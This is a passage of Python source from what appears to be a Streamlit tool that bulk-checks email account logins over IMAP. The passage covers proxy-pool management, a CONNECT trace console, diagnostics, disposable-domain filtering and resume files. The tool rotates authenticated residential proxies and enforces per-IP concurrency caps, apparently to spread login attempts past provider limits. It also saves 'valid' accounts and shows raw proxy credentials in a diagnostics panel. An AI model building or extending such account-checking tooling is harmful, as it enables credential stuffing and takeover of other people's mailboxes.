                   f"pass **{_ms['ok']}** | 407 **{_ms['auth']}** | other **{_ms['other']}** "
                   f"/ {_ms['n']} node(s), {_ms_age}s ago")
        if _ms.get("auth") and not _ms.get("ok"):
            if _p_ok:
                _mtail = ("every sampled node authenticated on 443 and was then refused "
                          "ON THE MAIL PORT, so the credential and the node are both "
                          "fine - the provider is refusing this destination. Set "
                          "**Proxy Mode Engine = off** (DIRECT) for the run.")
            else:
                _mtail = ("nodes failed the 443 control too, so the provider is "
                          "rejecting the credential or the plan itself, not the mail "
                          "port. Set **Proxy Mode Engine = off** (DIRECT), or check the "
                          "sub-user passwords and the plan's concurrency cap.")
            # FIX UI-5: this was the THIRD unconditional st.error and the one still
            # stamping FAILED onto Reset Display Fit.
            _mfull = "🚨 " + _ms_txt + " - " + _mtail
            (str_lit.caption if _steal else str_lit.error)(_mfull)
        else:
            str_lit.caption(_ms_txt)

    _tr = _probe_target_reachability()
    _tr_txt = "  ".join(f"{r['target']} {'OK' if r['ok'] else 'FAIL'}" for r in _tr)
    str_lit.caption(f"App-host direct reachability: {_tr_txt}")
    str_lit.caption(
        f"Concurrency: host cap **{CFG.get('HOST_CONCURRENCY')}** · per-IP cap "
        f"**{CFG.get('PROXY_IP_CONCURRENCY')}** · per-SUBUSER cap "
        f"**{CFG.get('PROXY_SUBUSER_CONCURRENCY')}** · proxy cap "
        f"**{CFG.get('PROXY_CONCURRENCY')}**"
        f" · rotation **{'RANDOM' if CFG.get('RANDOM_ROTATION') else 'round-robin'}**"
    )
    _rb = request_budget()
    str_lit.caption(
        f"Request budget: ~**{_rb['per_account']}** proxy request(s) per account worst case · "
        f"**{_rb['idle_per_min']:.0f}/min** background probing while idle · "
        f"**{_rb['cycle']}** per full pool cycle"
        + ("" if CFG.get("PROBER_IDLE_ENABLED", PROBER_IDLE_ENABLED_DEFAULT)
           else "  ·  idle probing **OFF** (probes only on load / Start / Re-probe)")
    )
    str_lit.caption(
        f"407 contract: quarantine after **{PROXY_407_QUARANTINE}** strikes · "
        f"force DIRECT after **{PROXY_407_FORCE_DIRECT}** in a rung · "
        f"park **{PROXY_407_COOLDOWN:.0f}s** · "
        f"same-host retries **{CFG.get('SAME_HOST_RETRIES')}** · "
        f"legacy 143/110 leash **{LEGACY_RUNG_TIMEOUT:.0f}s**"
    )
    str_lit.caption(
        f"Verdict guard: WRONG is confirmed across hosts = "
        f"**{CFG.get('CONFIRM_WRONG_ACROSS_HOSTS')}** · "
        f"self-signed = **{CFG.get('ALLOW_SELF_SIGNED')}** "
        f"(strict={CFG.get('TLS_STRICT')})"
    )

    if _q_now:
        str_lit.warning(f"🩹 Quarantined for 407: **{_q_now}** node(s)")
    if not all_proxies:
        str_lit.caption("No proxies configured - the engine will run fully DIRECT until "
                        "you add some.")
    elif _alive_now == 0:
        str_lit.warning("⚠ No node passed the tunnel probe. Press 📥 Fetch & Test All "
                        "Proxies again.")
    else:
        str_lit.caption("A 407 is reported TWO ways: '407 auth (node)' means the node "
                        "itself failed the 443 control - the credential or the plan. "
                        "'407 auth (dest only)' means the node authenticated and only "
                        "that destination was refused, so it keeps its score and stays "
                        "in the pool. A socket reset is reported separately, and a "
                        "LOGIN_DROPPED (* BYE) is a MAIL-SERVER event, not a proxy one.")

    _rc1, _rc2, _rc3 = str_lit.columns(3)
    with _rc1:
        if str_lit.button("🔁 Re-probe pool now", width="stretch"):
            clear_tunnel_cache()
            refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
            str_lit.session_state["_proxy_flash"] = ("success", "Pool re-probed.")
            str_lit.rerun()
    with _rc2:
        if str_lit.button("🧾 Show raw proxies.txt", width="stretch"):
            try:
                with open(CFG["PROXY_FILE"], encoding="utf-8", errors="ignore") as _pf:
                    _lines = [l.rstrip() for l in _pf if l.strip()]
                _uniq = list(dict.fromkeys(_lines))
                str_lit.caption(f"{len(_lines)} line(s), {len(_uniq)} unique, "
                                f"{'CREDS present' if any('@' in l for l in _lines) else 'NO CREDS (@ absent)'}")
                str_lit.code("\n".join(_lines[:60]), language="text")
            except Exception as _pf_err:
                str_lit.error(f"Could not read proxies.txt: {_pf_err}")
    with _rc3:
        if str_lit.button("↩️ Restore from proxies_all.txt", width="stretch",
                          help="Fetch & Test writes only the SURVIVORS into proxies.txt. "
                               "This puts the full raw fetched pool back."):
            try:
                if os.path.exists("proxies_all.txt"):
                    with open("proxies_all.txt", encoding="utf-8", errors="ignore") as _rf:
                        _restore = [l.strip() for l in _rf
                                    if l.strip() and not l.strip().startswith("#")]
                    if _restore:
                        with file_write_lock:
                            with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as _wf:
                                _wf.write("\n".join(_restore) + "\n")
                        clear_tunnel_cache()
                        log_startup(f"proxies.txt restored from proxies_all.txt "
                                    f"({len(_restore)} line(s)).")
                        str_lit.session_state["_proxy_flash"] = (
                            "success",
                            f"Restored {len(_restore)} line(s) from proxies_all.txt.")
                        str_lit.rerun()
                    else:
                        str_lit.session_state["_proxy_flash"] = (
                            "warning", "proxies_all.txt is empty.")
                        str_lit.rerun()
                else:
                    str_lit.session_state["_proxy_flash"] = (
                        "warning", "No proxies_all.txt yet - run Fetch & Test first.")
                    str_lit.rerun()
            except Exception as _rex:
                str_lit.error(f"Restore failed: {_rex}")

    with str_lit.expander("➕ Add Custom Proxies", expanded=False):
        custom_proxy_text = str_lit.text_area(
            "Paste proxies (host:port or user:pass@host:port)",
            placeholder="123.45.67.89:8080", height=100)
        if str_lit.button("Save Custom Proxies"):
            if custom_proxy_text.strip():
                try:
                    new_proxies = [l.strip() for l in custom_proxy_text.splitlines()
                                   if l.strip() and not l.strip().startswith("#")]
                    combined = list(dict.fromkeys(load_proxies() + new_proxies))
                    with file_write_lock:
                        with open(CFG["PROXY_FILE"], "w", encoding="utf-8") as f:
                            f.write("\n".join(combined) + "\n")
                    clear_tunnel_cache()
                    log_startup(f"Added {len(new_proxies)} custom proxies successfully.")
                    str_lit.session_state["_proxy_flash"] = (
                        "success", f"Added {len(new_proxies)} custom proxies successfully!")
                    str_lit.rerun()
                except Exception as ex:
                    str_lit.error(f"Error saving custom proxies: {ex}")

    # FIX PERF-7: the blocking st.spinner is gone - block 077 now drives its own
    # progress bar in 24-line chunks, so the sidebar keeps painting instead of
    # freezing for the whole batch budget.
    if str_lit.button("📥 Fetch & Test All Proxies"):
        str_lit.caption("Validating in 24-line chunks - the bar below moves.")
        _n_alive, _n_total = fetch_and_test_all_proxies()
        _msr = STATE.get("mail_spot") or {}
        if _n_alive:
            _msg = (f"✅ **{_n_alive}** node(s) kept from **{_n_total}** line(s), saved "
                    f"and armed. Press 🔥 Start Live Checking Engine.")
            if _msr.get("auth") and not _msr.get("ok"):
                _msg += (f"  🚨 ...but the MAIL-destination spot check 407'd on "
                         f"{_msr['auth']}/{_msr['n']} sampled node(s) against "
                         f"{_msr['host']}:{_msr['port']} - set **Proxy Mode Engine = off** "
                         f"until it resets.")
            str_lit.session_state["_proxy_flash"] = ("success", _msg)
        else:
            str_lit.session_state["_proxy_flash"] = (
                "warning", "No node passed validation. Check WEBSHARE_KEYS in secrets.")
        str_lit.rerun()

    with str_lit.expander("📊 Proxy Health & Geo Dashboard", expanded=False):
        with probe_stats_lock:
            _pstats = dict(probe_stats)
        if proxy_meta:
            rows = []
            for p_str, meta in proxy_meta.items():
                info = parse_proxy(p_str)
                _ps = _pstats.get(p_str) or {}
                if _ps:
                    _rlabel = _PROBE_REASON_LABEL.get(_ps.get("reason", ""),
                                                      _ps.get("reason", ""))
                    _age2 = f"{int(time.time() - _ps.get('ts', time.time()))}s ago"
                    _last = f"{_rlabel} · {_age2}"
                else:
                    _last = "-"
                # FIX UI-6: the Latency column read proxy_meta, which is only ever
                # written on SUCCESS - so every 407 node showed a flat 0 ms. The
                # probe records latency on failure too; read that first.
                _lat = _ps.get("latency_ms", meta.get("latency_ms", 0))
                rows.append({
                    "Proxy": f"{info['host']}:{info['port']}" if info else "Unknown",
                    "User": (info.get("user") if info else "") or "",
                    "Latency": f"{_lat} ms",
                    "Country": meta.get("country", "Unknown"),
                    "Region": meta.get("region", "Unknown"),
                    "Score": meta.get("score", 50),
                    "Fails": meta.get("fails", 0),
                    "Successes": meta.get("success", 0),
                    "407s": _proxy_407.get(p_str, 0),
                    "Parked": "yes" if _proxy_407_parked(p_str) else "",
                    "Attempts": _ps.get("attempts", 0),
                    "Last Probe": _last,
                    "Last Error": (_ps.get("error", "") or "")[:200],
                    "Quarantined": "yes" if proxy_is_quarantined(p_str) else "",
                })
            str_lit.caption(
                f"Probe target {CFG.get('PROBE_TARGET', PROBE_TARGET_DEFAULT)} · "
                f"budget {probe_timeout():.0f}s · strict={CFG.get('PROBE_STRICT', True)} · "
                f"dedupe={CFG.get('DEDUPE_PROXIES', True)} · "
                f"max_targets={CFG.get('PROBE_MAX_TARGETS')} · "
                f"scheme2={CFG.get('PROBE_SECOND_SCHEME')} · "
                f"idle_probe={CFG.get('PROBER_IDLE_ENABLED')} · "
                f"mail_spot={CFG.get('MAIL_SPOT_CHECK')}"
            )
            str_lit.dataframe(pd.DataFrame(rows), width="stretch")
            col_ref1, col_ref2, col_ref3, col_ref4 = str_lit.columns(4)
            with col_ref1:
                if str_lit.button("🔄 Refresh Dashboard"):
                    str_lit.rerun()
            with col_ref2:
                if str_lit.button("🔁 Re-probe All"):
                    clear_tunnel_cache()
                    refresh_alive_pool(force=True, budget=PROBE_BATCH_BUDGET)
                    str_lit.session_state["_proxy_flash"] = ("success", "Re-probed.")
                    str_lit.rerun()
            with col_ref3:
                if str_lit.button("🧹 Clean Dead / Low-Score"):
                    with proxy_lock:
                        for k, m in list(proxy_meta.items()):
                            if m.get("score", 50) < 5 or m.get("fails", 0) >= 10:
                                proxy_meta.pop(k, None)
                    save_proxy_meta()
                    str_lit.session_state["_proxy_flash"] = ("success", "Cleaned!")
                    str_lit.rerun()
            with col_ref4:
                if str_lit.button("♻️ Lift 407 Quarantine"):
                    clear_proxy_quarantine()
                    str_lit.session_state["_proxy_flash"] = ("success", "Quarantine lifted.")
                    str_lit.rerun()
        else:
            str_lit.info("No proxy metadata recorded yet.")
# @@END 080 PROXY_MGMT_UI

# @@BLOCK 081 PROXY_DEBUG_AND_DIAG_UI deps=014,016,024,026,027,030,052,070,073,080
with str_lit.sidebar:
    with str_lit.expander("🩺 Proxy Debug Console", expanded=False):
        str_lit.caption(
            "Runs ONE line through a raw CONNECT trace and prints the exact bytes the "
            "proxy sends back, plus the parsed credential fields. Read-only - it does "
            "not touch the pool, the scores or the quarantine."
        )
        str_lit.caption(
            "FIX 407-SCOPE: the target now defaults to the MAIL destination, not the "
            "443 baseline. Trace WITH credentials on the mail target, then on "
            "443 - a 200 on 443 plus a 407 on 993 is a destination refusal and the "
            "node is fine; a 407 on both is the credential or the plan."
        )

        if not all_proxies:
            str_lit.info("No proxy lines loaded - run Fetch & Test first.")
        else:
            _dbg_opts = [f"#{i + 1}  {p[:64]}" for i, p in enumerate(all_proxies[:200])]
            _dbg_sel = str_lit.selectbox(
                "Line to trace", range(len(_dbg_opts)),
                format_func=lambda i: _dbg_opts[i], key="_dbg_sel")
            _dbg_sel = min(_dbg_sel, len(_dbg_opts) - 1)
            _dbg_line = all_proxies[_dbg_sel]

            try:
                _mh0, _mp0 = _mail_spot_target()
                _tgt_def = f"{_mh0}:{_mp0}"
            except Exception:
                _tgt_def = f"{MAIL_SPOT_FALLBACK[0]}:{MAIL_SPOT_FALLBACK[1]}"
            # FIX W-2: seeded, not passed as value= - a keyed widget that also gets a
            # default raises the "created with a default value but also had its value
            # set via the Session State API" warning on every rerun.
            if "_dbg_target" not in str_lit.session_state:
                str_lit.session_state["_dbg_target"] = _tgt_def
            _dbg_target = str_lit.text_input("CONNECT target (host:port)", key="_dbg_target")
            _bc0a, _bc0b = str_lit.columns(2)
            with _bc0a:
                if str_lit.button("✉️ Use the MAIL target", width="stretch"):
                    str_lit.session_state["_dbg_target"] = (
                        f"{MAIL_SPOT_FALLBACK[0]}:{MAIL_SPOT_FALLBACK[1]}")
                    str_lit.rerun()
            with _bc0b:
                if str_lit.button("🌐 Use the 443 control", width="stretch"):
                    str_lit.session_state["_dbg_target"] = (
                        f"{PROBE_CONTROL_TARGETS[0][0]}:{PROBE_CONTROL_TARGETS[0][1]}")
                    str_lit.rerun()

            # ---- parse audit -------------------------------------------------
            _dp = parse_proxy(_dbg_line)
            _has_at = "@" in _dbg_line
            _n_at = _dbg_line.count("@")
            _man_user, _man_pw = "", ""
            if _has_at:
                _lhs = _dbg_line.rsplit("@", 1)[0]
                if ":" in _lhs:
                    _man_user, _man_pw = _lhs.split(":", 1)

            def _mask(s):
                if not s:
                    return "(EMPTY)"
                if len(s) <= 4:
                    return "*" * len(s)
                return s[:2] + "*" * (len(s) - 4) + s[-2:]

            _RISKY = set("@:/?#[]% ")
            _risky_pw = sorted(set(_man_pw) & _RISKY)
            _risky_user = sorted(set(_man_user) & _RISKY)

            str_lit.code("\n".join([
                f"raw line      : {_dbg_line}",
                f"@ count       : {_n_at}" + ("   <-- WRONG, must be 1" if _n_at != 1 else ""),
                f"parse_proxy() : {'OK' if _dp else 'FAILED -> None'}",
                f"  host        : {(_dp or {}).get('host', '(none)')}",
                f"  port        : {(_dp or {}).get('port', '(none)')}",
                f"  user        : {_man_user or '(none)'}",
                f"  password    : {_mask(_man_pw)}   len={len(_man_pw)}",
                f"risky chars in user     : {_risky_user or 'none'}",
                f"risky chars in password : {_risky_pw or 'none'}",
            ]), language="text")

            if not _has_at:
                str_lit.error("No '@' in the line - it is an IP-auth line, no credentials "
                              "are sent at all. Webshare must be switched off IP "
                              "Authorization and onto Username/Password.")
            elif not _man_pw:
                str_lit.error("Password is EMPTY - the line has user@host:port with no "
                              "colon and password. That produces 407 on every node.")
            elif _risky_pw or _risky_user:
                str_lit.warning("Credential contains characters that break URL parsing "
                                f"({', '.join(sorted(set(_risky_pw) | set(_risky_user)))}). "
                                "URL-encode them in proxies.txt.")

            # ---- trace engine -------------------------------------------------
            def _dbg_connect(host, port, thost, tport, user, pw, mode):
                out = []
                t0 = time.time()
                try:
                    sk = socket.create_connection((host, int(port)), timeout=10)
                except Exception as e:
                    return [f"TCP connect FAILED after {(time.time() - t0) * 1000:.0f} ms "
                            f"-> {type(e).__name__}: {e}"], None
                out.append(f"TCP connect OK in {(time.time() - t0) * 1000:.0f} ms")
                status = None
                try:
                    sk.settimeout(10)
                    hdr = [f"CONNECT {thost}:{tport} HTTP/1.1",
                           f"Host: {thost}:{tport}",
                           "Proxy-Connection: keep-alive"]
                    if mode == "auth" and user and pw:
                        _b64 = base64.b64encode(f"{user}:{pw}".encode()).decode()
                        hdr.append(f"Proxy-Authorization: Basic {_b64}")
                    out.append("--- sent ---")
                    for h in hdr:
                        out.append("  " + (h[:48] + "..."
                                           if h.startswith("Proxy-Authorization") else h))
                    out.append("--- end ---")
                    sk.sendall(("\r\n".join(hdr) + "\r\n\r\n").encode())
                    t1 = time.time()
                    buf = b""
                    while b"\r\n" not in buf and len(buf) < 1024:
                        ch = sk.recv(1024)
                        if not ch:
                            break
                        buf += ch
                    out.append(f"first byte after {(time.time() - t1) * 1000:.0f} ms")
                    first = buf.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                    out.append("--- response ---")
                    out.append(buf[:400].decode("latin-1", "replace").rstrip())
                    out.append("--- end ---")
                    _parts = first.split()
                    if len(_parts) >= 2 and _parts[1].isdigit():
                        status = int(_parts[1])
                except Exception as e:
                    out.append(f"exchange FAILED -> {type(e).__name__}: {e}")
                finally:
                    try:
                        sk.close()
                    except Exception:
                        pass
                return out, status

            def _dbg_verdict(status, sent_creds, target):
                if status is None:
                    return "NO STATUS LINE - connected but the proxy answered nothing."
                if status == 200:
                    return (f"200 AUTH ACCEPTED - proxy and these exact credentials are "
                            f"fine for {target}. If a MAIL target still 407s while this "
                            f"target 200s, the node is good and the provider is refusing "
                            f"the destination - run DIRECT, do not re-fetch the pool.")
                if status == 407:
                    if not sent_creds:
                        return ("407 with NO credentials on the wire - the line carries no "
                                "usable user:pass. Fix proxies.txt, not the app.")
                    return ("407 WITH correct Basic credentials on the wire - the PROVIDER "
                            "is rejecting this exact user:pass. Now trace the SAME line "
                            "against the 443 control: if that also 407s it is the "
                            "credential, the sub-user or the plan; if 443 200s, it is "
                            "only this destination.")
                if status == 403:
                    return (f"403 - the provider refuses this DESTINATION (port or host "
                            f"policy). Webshare blocks 25, 110, 465 and 587 permanently. "
                            f"The node and the credential are both fine.")
                if status in (402, 429, 502, 503):
                    return (f"{status} - proxy reachable but refusing service (plan, "
                            f"bandwidth, concurrency cap or ban), not a credential typo.")
                return f"Unexpected status {status}."

            def _dbg_run(kind):
                thost, _, tport = _dbg_target.rpartition(":")
                tport = int(tport or 993)
                log = [f"=== {kind} | {time.strftime('%H:%M:%S')} ==="]
                if kind == "web-requests":
                    try:
                        import requests as _rq
                        _px = {"http": f"http://{_dbg_line}", "https": f"http://{_dbg_line}"}
                        _t0 = time.time()
                        _rr = _rq.get("https://api.ipify.org", proxies=_px, timeout=15)
                        log.append(f"GET api.ipify.org -> {_rr.status_code} in "
                                   f"{(time.time() - _t0) * 1000:.0f} ms, body={_rr.text[:40]!r}")
                        log.append(_dbg_verdict(_rr.status_code, True, "api.ipify.org:443"))
                    except Exception as e:
                        log.append(f"requests FAILED -> {type(e).__name__}: {e}")
                        log.append("Could not even reach the proxy with requests.")
                    return log
                _mode = "noauth" if kind == "raw-noauth" else "auth"
                if kind == "raw-noauth":
                    _host, _port, _u, _pw = "", "", "", ""
                    _q = parse_proxy(_dbg_line) or {}
                    _host, _port = _q.get("host", ""), _q.get("port", 0)
                else:
                    _q = parse_proxy(_dbg_line) or {}
                    _host, _port = _q.get("host", ""), _q.get("port", 0)
                    _u, _pw = _man_user, _man_pw
                if not _host:
                    return log + ["Could not parse host from the line."]
                lines, status = _dbg_connect(_host, _port, thost, tport, _u, _pw, _mode)
                log.extend(lines)
                log.append("VERDICT: " + _dbg_verdict(status, _mode == "auth",
                                                     f"{thost}:{tport}"))
                return log

            _bc1, _bc2 = str_lit.columns(2)
            with _bc1:
                _go_auth = str_lit.button("▶️ Trace WITH credentials", width="stretch")
                _go_none = str_lit.button("▶️ Trace WITHOUT credentials", width="stretch")
            with _bc2:
                _go_web = str_lit.button("▶️ Web probe (ipify)", width="stretch")
                _go_clear = str_lit.button("🧽 Clear trace log", width="stretch")

            if _go_clear:
                str_lit.session_state["_dbg_log"] = []
            if _go_auth or _go_none or _go_web:
                _kind = ("raw-auth" if _go_auth else
                         "raw-noauth" if _go_none else "web-requests")
                _add = _dbg_run(_kind)
                _log = str_lit.session_state.setdefault("_dbg_log", [])
                _log.extend(_add)
                str_lit.session_state["_dbg_log"] = _log[-400:]

            _show = str_lit.session_state.get("_dbg_log") or []
            if _show:
                str_lit.code("\n".join(_show), language="text")
                str_lit.download_button(
                    "💾 Download trace log", "\n".join(_show),
                    file_name=f"proxy_trace_{int(time.time())}.txt", mime="text/plain")
            else:
                str_lit.caption("No trace yet. Start with **WITH credentials** on line #1.")

with str_lit.expander("🔬 Deep Diagnostics - copy/paste this to debug", expanded=False):
    str_lit.caption(
        "Everything needed to diagnose the pool remotely. Copy the whole block "
        "(hover it, copy icon) and paste it back. It includes raw proxies.txt lines, "
        "so proxy credentials are visible."
    )

    _dc1, _dc2 = str_lit.columns(2)
    with _dc1:
        if str_lit.button("🔁 Rebuild", width="stretch"):
            STATE["diag_cache"] = {"ts": 0.0, "text": "", "user": ""}
            str_lit.rerun()
    with _dc2:
        if str_lit.button("🧪 Direct self-test", width="stretch"):
            with str_lit.spinner("Running direct self-test..."):
                _probe_target_reachability(force=True)
                _lines = [f"self-test {datetime.now().strftime('%H:%M:%S')}"]
                _lines.extend(_imap_caps_selftest())
                for _raw, _want in (
                    ("command: LOGIN => IMAP server terminating connection", LOGIN_DROPPED),
                    ("* BYE Too many simultaneous connections", RETRY_LATER),
                    ("timed out", CONNECTION_FAILED),
                ):
                    try:
                        _got = st_classify(_raw)
                    except Exception as _ce:
                        _got = f"<{_ce}>"
                    _lines.append(f"  classify {_raw[:46]:48} -> {_got} "
                                  f"{'OK' if _got == _want else 'WANTED ' + _want}")
                for r in _probe_target_reachability(force=True):
                    _lines.append(f"  direct {r['target']}: {'OK' if r['ok'] else 'FAIL'} "
                                  f"{r['ms']}ms resolved={r.get('resolved')} {r['err']}")
                if alive_pool:
                    _one = alive_pool[0]
                    _res = tunnel_probe(_one)
                    _lines.append(f"  tunnel via {_one}: ok={_res['ok']} "
                                  f"reason={_res['reason']} lat={_res['latency_ms']}ms "
                                  f"control={_res.get('control', '')} "
                                  f"err={_res.get('error', '')}")
                    _mh, _mp = _mail_spot_target()
                    _mres = tunnel_probe(_one, targets=[(_mh, _mp, "mailspot")],
                                         timeout=MAIL_SPOT_TIMEOUT)
                    _lines.append(f"  MAIL DESTINATION {_mh}:{_mp} via {_one}: "
                                  f"ok={_mres['ok']} reason={_mres['reason']} "
                                  f"control={_mres.get('control', '')} "
                                  f"err={_mres.get('error', '')}")
                    if _mres.get("reason") == "auth_dest":
                        _lines.append("  -> the node authenticated on the control and was "
                                      "refused only by the mail destination. Node is GOOD.")
                else:
                    _lines.append("  tunnel: no alive node to test")
                # FIX ISO-5 (v13.49): selftest is PROCESS state and this text names
                # the alive node and the egress geo, so it was rendering in the
                # OTHER user's expander. Stamp the owner, exactly as diag_cache is.
                STATE["selftest"] = {"ts": time.time(), "text": "\n".join(_lines),
                                     "user": _cache_owner()}
            STATE["diag_cache"] = {"ts": 0.0, "text": "", "user": ""}
            str_lit.success("Self-test done.")

    # FIX P1-3: this used to run on EVERY rerun, inside a COLLAPSED expander -
    # and it reads proxies.txt, walks proxy_meta, probes target reachability,
    # resolves the egress geo and calls socket.getfqdn().  Cache it.
    #
    # v13.48: STATE is process-wide, so that cache was shared across users -
    # raw proxies.txt credentials and the active CFG included - for the whole
    # TTL.  Stamp the owner (block 037) and rebuild on a mismatch, exactly the
    # way the two valid caches are keyed.
    _dcache = STATE.setdefault("diag_cache", {"ts": 0.0, "text": "", "user": ""})
    _dc_who = _cache_owner()
    if ((not _dcache.get("text")) or (_dcache.get("user") != _dc_who)
            or (time.time() - _dcache.get("ts", 0.0)) > DIAG_CACHE_TTL):
        _dcache = {"ts": time.time(), "text": build_diagnostics_text(), "user": _dc_who}
        STATE["diag_cache"] = _dcache
    _diag = _dcache["text"]

    # FIX ISO-5: only show a self-test that belongs to THIS user.
    _st = STATE.get("selftest") or {}
    if _st.get("user") != _cache_owner():
        _st = {}
    if _st.get("text"):
        str_lit.markdown("**Last self-test:**")
        str_lit.code(_st["text"], language="text")

    str_lit.download_button(
        "⬇️ Download bundle", data=_diag,
        file_name=f"diag_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
        mime="text/plain", width="stretch",
    )
    str_lit.code(_diag, language="text")
# @@END 081 PROXY_DEBUG_AND_DIAG_UI

# @@BLOCK 082 PREFILTER_TABLES deps=002,021,043
DISPOSABLE = {
    "tempmail.com", "temp-mail.org", "guerrillamail.com", "guerrillamail.org",
    "10minutemail.com", "10minutemail.net", "mailinator.com", "maildrop.cc",
    "yopmail.com", "yopmail.fr", "trashmail.com", "trashmail.me",
    "getnada.com", "throwawaymail.com", "fakeinbox.com", "sharklasers.com",
    "grr.la", "guerrillamailblock.com", "pokemail.net", "spam4.me",
    "dispostable.com", "mailnesia.com", "tempail.com", "emailondeck.com",
    "mohmal.com", "tempinbox.com", "mailcatch.com", "mailnull.com",
    "spamgourmet.com", "mytemp.email", "tmpmail.org", "tmpmail.net",
    "temp-mail.io", "1secmail.com", "1secmail.org", "1secmail.net",
}
COMMON_TYPOS = {
    "gmai.com", "gamil.com", "gmal.com", "gmial.com", "g-mail.com",
    "outloo.com", "outlok.com", "hotmial.com", "hotmai.com", "hotmali.com",
    "yaho.com", "yahooo.com", "yhoo.com", "iclound.com", "ezweb.ne",
}
STRICT_APP_PROVIDERS = STRICT_APP
ZERO_ACCESS_PROVIDERS = ZERO_ACCESS
EMAIL_REGEX = re.compile(r"^[\w\.-]+@[\w\.-]+\.\w+$")
DISPOSABLE_EXTRA = {"rerttymail.com", "tmpmail.org", "tmpmail.net", "tempmailo.com"}
DISPOSABLE_FILE = "disposable_domains.txt"


def load_disposable_set():
    found = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
    if os.path.exists(DISPOSABLE_FILE):
        try:
            with open(DISPOSABLE_FILE, encoding="utf-8", errors="ignore") as f:
                found.update(x.strip().lower() for x in f
                             if x.strip() and not x.startswith("#"))
        except Exception:
            pass
    if requests and len(found) < 500:
        try:
            r = requests.get(
                "https://raw.githubusercontent.com/disposable-email-domains/"
                "disposable-email-domains/master/disposable_email_blocklist.conf",
                timeout=8)
            if r.ok and r.text:
                found.update(x.strip().lower() for x in r.text.splitlines()
                             if x.strip() and not x.startswith("#"))
                with open(DISPOSABLE_FILE, "w", encoding="utf-8") as f:
                    f.write("\n".join(sorted(found)))
                log_startup(f"Disposable blocklist loaded: {len(found)}")
        except Exception as e:
            log_startup(f"Disposable list fetch skipped: {e}")
    return found


# FIX LAG-D (v13.49): load_disposable_set() does a blocking HTTP GET with an 8s
# timeout and it was called right here on the IMPORT path, so every cold deploy
# sat on it before the first paint. The static set covers the gap and the fetch
# now runs in the background; is_disposable() picks up the fuller set as soon as
# it lands.
DISPOSABLE_LIVE = set(DISPOSABLE) | set(DISPOSABLE_EXTRA)
if os.path.exists(DISPOSABLE_FILE):
    try:
        with open(DISPOSABLE_FILE, encoding="utf-8", errors="ignore") as _df:
            DISPOSABLE_LIVE.update(x.strip().lower() for x in _df
                                   if x.strip() and not x.startswith("#"))
    except Exception:
        pass
else:
    def _fetch_disposables_bg():
        global DISPOSABLE_LIVE
        try:
            DISPOSABLE_LIVE = set(load_disposable_set())
        except Exception:
            pass

    threading.Thread(target=_fetch_disposables_bg, daemon=True,
                     name="disposable-fetch").start()


def is_disposable(email):
    try:
        domain = email.split("@")[-1].lower().strip()
        if domain in DISPOSABLE_LIVE or domain in DISPOSABLE_EXTRA:
            return True
        return any(p in domain for p in ("tempmail", "rerttymail", "mailinator",
                                         "yopmail", "guerrilla", "throwaway",
                                         "10minute"))
    except Exception:
        return False
# @@END 082 PREFILTER_TABLES

# @@BLOCK 083 UNFINISHED_IO deps=007,082
def list_unfinished_runs():
    """Every unfinished record on disk, newest first.

    FIX RS-1: this used to call

        glob.glob(path, reverse=True)

    `reverse` is a sorted() keyword, not a glob() one, so the call raised
    TypeError and the bare `except Exception: pass` below swallowed it. This
    function therefore returned [] on EVERY call: the Resume Unfinished counter
    read 0, the inspector said "No items", and the results summary could never
    name a stop reason - while unfinished_live.json sat on disk holding the
    remaining lines. A substring gate cannot catch that, so test_resume_io.py
    now calls the expression.
    """
    runs = []
    _res = user_file("mail_results")
    try:
        os.makedirs(_res, exist_ok=True)
        paths = sorted(glob.glob(os.path.join(_res, "unfinished_*.json")), reverse=True)
    except Exception as e:
        warnings.warn(f"list_unfinished_runs: glob failed ({e})")
        return runs
    for path in paths:
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
        except Exception:
            continue
        if isinstance(data, dict):
            data["file"] = path
            runs.append(data)
    return runs


def unfinished_remaining_count():
    """How many account LINES are resumable right now - not how many FILES.

    The metric sits in a row of account counts ("Ready to Check", "Disposables"),
    and len(list_unfinished_runs()) counts files. There is only ever one file, so
    a fixed glob alone would print 1 for 25 accounts.
    """
    return len(runstate.remaining())


def save_unfinished(reason, remaining, checked, total):
    """Write the resume record ATOMICALLY.

    runstate.interrupt() re-reads and rewrites unfinished_live.json while the
    loop's checkpoint may be mid-write; a plain truncating write can hand it a
    half file and the reason mirror is then lost.
    """
    _res = user_file("mail_results")
    os.makedirs(_res, exist_ok=True)
    path = os.path.join(_res, "unfinished_live.json")
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump({"id": "live", "reason": reason, "checked": checked, "total": total,
                   "remaining": remaining,
                   "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}, f)
    os.replace(tmp, path)
    return path


def clear_unfinished():
    path = os.path.join(user_file("mail_results"), "unfinished_live.json")
    if os.path.exists(path):
        try:
            os.remove(path)
        except Exception:
            pass
# @@END 083 UNFINISHED_IO

# @@BLOCK 084 DOMAIN_RESOLVE deps=039,052,058
def check_domain_resolvable(domain, persist=True):
    with cache_lock:
        if domain in domain_cache and "resolvable" in domain_cache[domain]:
            return domain_cache[domain]["resolvable"]
    resolvable = False
    try:
        if dns:
            try:
                if dns.resolver.resolve(domain, "MX"):
                    resolvable = True
            except Exception:
                try:
                    if dns.resolver.resolve(domain, "A"):
                        resolvable = True
                except Exception:
                    pass
        if not resolvable:
            socket.gethostbyname(domain)
            resolvable = True
    except Exception:
        resolvable = False
    with cache_lock:
        domain_cache.setdefault(domain, {})["resolvable"] = resolvable
    if persist:
        save_domain_cache()
    return resolvable
# @@END 084 DOMAIN_RESOLVE

# @@BLOCK 085 PREV_VALID_IO deps=037,038
def load_previous_valid():
    now = time.time()
    who = _cache_owner()
    if (_PREV_VALID_CACHE["data"]
            and _PREV_VALID_CACHE.get("user") == who
            and (now - _PREV_VALID_CACHE["ts"]) < 20.0):
        return set(_PREV_VALID_CACHE["data"])
    seen = set()
    try:
        _res = user_file("mail_results")
        paths = sorted(glob.glob(os.path.join(_res, "valid_*.txt")), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            _p = user_file(extra)
            if os.path.exists(_p):
                paths.append(_p)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
